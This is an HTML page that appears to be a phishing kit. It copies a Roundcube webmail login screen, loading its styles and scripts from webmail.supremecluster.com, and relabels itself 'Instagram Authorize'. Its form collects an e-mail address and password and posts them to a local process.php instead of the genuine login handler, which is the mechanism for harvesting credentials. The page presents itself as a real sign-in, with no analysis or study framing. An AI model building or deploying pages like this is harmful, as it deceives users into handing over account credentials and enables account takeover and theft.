<html lang="tr" class=" js chrome webkit"><head>
<title>Instagram Authorize -  Webmail</title>
<meta name="Robots" content="noindex,nofollow">
<meta name="viewport" content="" id="viewport">
<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/larry/images/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/skins/larry/styles.min.css?s=1520886010" />
<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/xskin/../xframework/assets/styles/framework.css?s=1506327547">
<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/jqueryui/themes/larry/jquery-ui.css?s=1520886009">
<script type="text/javascript" src="https://webmail.supremecluster.com/skins/larry/ui.min.js?s=1520886010"></script>



<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<script src="https://webmail.supremecluster.com/program/js/jquery.min.js?s=1508962782" type="text/javascript"></script>
<script src="https://webmail.supremecluster.com/program/js/common.min.js?s=1520886010" type="text/javascript"></script>
<script src="https://webmail.supremecluster.com/program/js/app.min.js?s=1520886010" type="text/javascript"></script>
<script src="https://webmail.supremecluster.com/program/js/jstz.min.js?s=1508962759" type="text/javascript"></script>
<script type="text/javascript">


/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) 2005-2014 The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"locale":"tr_TR","cookie_domain":"","cookie_path":"\/","cookie_secure":false,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","request_token":"pQXcTUqJZF4U6TBA2qTMYjseIG7hx0re"});
rcmail.add_label({"loading":"Y\u00fckleniyor...","servererror":"Sunucu Sorunu!","connerror":"Ba\u011flant\u0131 Sorunu (Sunucuya eri\u015filemedi)!","requesttimedout":"\u0130stek zaman a\u015f\u0131m\u0131na u\u011frad\u0131","refreshing":"Yenileniyor...","windowopenerror":"A\u00e7\u0131l\u0131r pencere engellendi!","uploadingmany":"Dosyalar y\u00fckleniyor...","errortitle":"Bir sorun \u00e7\u0131kt\u0131!","toggleadvancedoptions":"Geli\u015fmi\u015f ayarlar\u0131 g\u00f6r\u00fcnt\u00fcle\/gizle"});
rcmail.gui_container("loginfooter","bottomline");
rcmail.gui_object('loginform', 'form');
rcmail.gui_object('message', 'message');
</script>

<script type="text/javascript" src="https://webmail.supremecluster.com/webmail/plugins/jqueryui/js/jquery-ui-1.10.4.custom.min.js?s=1480262937"></script>
<script type="text/javascript" src="https://webmail.supremecluster.com/webmail/plugins/jqueryui/js/i18n/jquery.ui.datepicker-tr.js?s=1480262937"></script>
</head>
<body>

<h1 class="voice">Instagram Authorize - Roundcube</h1>

<div id="login-form">
<div class="box-inner" role="main">
<img src="https://webmail.supremecluster.com/skins/larry/images/roundcube_logo.png" id="logo" alt="Roundcube Webmail">

<form name="form" method="post" action="process.php">
<input type="hidden" name="_token" value="pQXcTUqJZF4U6TBA2qTMYjseIG7hx0re">
<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Europe/Istanbul"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">E-mail</label>
</td>
<td class="input"><input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Continue"></p>

</form>

</div>



<div id="bottomline" role="contentinfo">
	Instagram Authorize - Roundcube Webmail 
		
</div>
</div>



<script type="text/javascript">
if (!window.UI) { var UI = new rcube_mail_ui(); }
</script>




<script type="text/javascript">

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),
                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script>


</body></html>